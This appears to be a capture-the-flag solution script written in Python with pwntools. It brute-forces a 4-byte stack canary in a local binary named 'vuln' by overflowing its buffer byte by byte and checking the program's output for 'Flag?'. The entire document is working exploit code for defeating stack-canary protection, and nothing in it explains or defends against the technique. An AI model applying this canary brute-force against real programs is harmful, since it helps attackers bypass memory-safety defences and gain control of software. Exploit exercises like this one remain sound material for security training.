from pwn import *


curr = ""
for j in range(4):
	for i in range(256):
	
		c = process('./vuln')
		c.recvuntil('How Many Bytes will You Write Into the Buffer?\n>')
		c.sendline(str(j+33))
		c.recvuntil('Input> ')
		log.info('sending stack override')
		payload = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH'
		payload += curr
		payload += bytearray.fromhex(hex(i)[2:].zfill(2))
		log.info(payload)
		c.sendline(payload)
		info = c.recvall()
		log.info(info)
		if info.find('Flag?') != -1:
			log.info('found canary value: ' + str(i))
			curr += bytearray.fromhex(hex(i)[2:].zfill(2))
			break
log.info(hex(unpack(curr, 32, endian='little')))
